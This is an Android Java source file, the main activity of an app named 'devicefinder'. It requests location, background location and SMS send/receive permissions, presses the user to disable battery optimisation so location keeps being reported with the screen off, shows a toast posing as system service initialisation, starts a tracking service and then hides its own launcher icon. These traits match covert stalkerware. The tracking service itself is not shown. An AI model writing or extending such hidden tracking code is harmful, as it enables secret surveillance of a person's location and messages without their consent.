package com.example.devicefinder;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int REQ_PERMISSIONS = 100;
    private boolean serviceStarted = false;
    private boolean waitingForBatterySetting = false;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (getIntent() != null && getIntent().getCategories() != null
                && getIntent().getCategories().contains(Intent.CATEGORY_LAUNCHER)) {
            Toast.makeText(this, "🛡️ 系统服务初始化中", Toast.LENGTH_SHORT).show();
        }
        checkAndRequestPermissions();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (waitingForBatterySetting) {
            waitingForBatterySetting = false;
            if (isBatteryOptimizationIgnored()) {
                Toast.makeText(this, "✅ 电池优化已关闭", Toast.LENGTH_SHORT).show();
                startTrackingServiceAndFinish();
            } else {
                promptBatteryOptimizationAgain();
            }
        }
    }

    private void checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT < 23) {
            proceedAfterPermissions();
            return;
        }
        boolean needFgLoc = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED;
        boolean needBgLoc = Build.VERSION.SDK_INT >= 29 && checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED;
        boolean needNotif = Build.VERSION.SDK_INT >= 33 && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED;
        boolean needSms = checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
                          checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED;

        if (needFgLoc || needNotif || needSms) {
            requestPermissions(new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.SEND_SMS,
                    Build.VERSION.SDK_INT >= 33 ? Manifest.permission.POST_NOTIFICATIONS : Manifest.permission.ACCESS_COARSE_LOCATION
            }, REQ_PERMISSIONS);
        } else if (needBgLoc) {
            if (Build.VERSION.SDK_INT >= 30) {
                new AlertDialog.Builder(this)
                        .setTitle("设置后台定位")
                        .setMessage("请在下个页面选择「权限」→「位置信息」→「始终允许」。")
                        .setCancelable(false)
                        .setPositiveButton("去设置", (dialog, which) -> {
                            waitingForBatterySetting = true;
                            try {
                                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                intent.setData(Uri.parse("package:" + getPackageName()));
                                startActivity(intent);
                            } catch (Exception e) {
                                waitingForBatterySetting = false;
                                proceedAfterPermissions();
                            }
                        }).show();
            } else {
                requestPermissions(new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, REQ_PERMISSIONS);
            }
        } else {
            proceedAfterPermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERMISSIONS) checkAndRequestPermissions();
    }

    private void proceedAfterPermissions() {
        if (isBatteryOptimizationIgnored()) startTrackingServiceAndFinish();
        else promptBatteryOptimization();
    }

    private boolean isBatteryOptimizationIgnored() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Exception e) { return false; }
    }

    private void promptBatteryOptimization() {
        new AlertDialog.Builder(this)
                .setTitle("必须关闭电池优化")
                .setMessage("为保证息屏后仍能持续上报位置，\n请将本应用设为「不限制」。")
                .setCancelable(false)
                .setPositiveButton("去设置", (dialog, which) -> {
                    waitingForBatterySetting = true;
                    openBatteryOptimizationSettings();
                })
                .setNegativeButton("暂时跳过", (dialog, which) -> startTrackingServiceAndFinish()).show();
    }

    private void promptBatteryOptimizationAgain() {
        new AlertDialog.Builder(this)
                .setTitle("电池优化仍未关闭")
                .setMessage("系统限制尚未解除，息屏后可能无法定位。")
                .setCancelable(false)
                .setPositiveButton("再去设置", (dialog, which) -> {
                    waitingForBatterySetting = true;
                    openBatteryOptimizationSettings();
                })
                .setNegativeButton("放弃", (dialog, which) -> startTrackingServiceAndFinish()).show();
    }

    private void openBatteryOptimizationSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            if (intent.resolveActivity(getPackageManager()) != null) startActivity(intent);
            else startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
        } catch (Exception e) {
            waitingForBatterySetting = false;
            startTrackingServiceAndFinish();
        }
    }

    private void startTrackingServiceAndFinish() {
        if (!serviceStarted) {
            serviceStarted = true;
            Intent intent = new Intent(this, TrackingService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent);
            else startService(intent);
            hideLauncherIcon();
        }
        finish();
    }

    private void hideLauncherIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName alias = new ComponentName(this, "com.example.devicefinder.VisibleAliasActivity");
            if (pm.getComponentEnabledSetting(alias) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                pm.setComponentEnabledSetting(alias, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            }
        } catch (Exception ignored) {}
    }
}
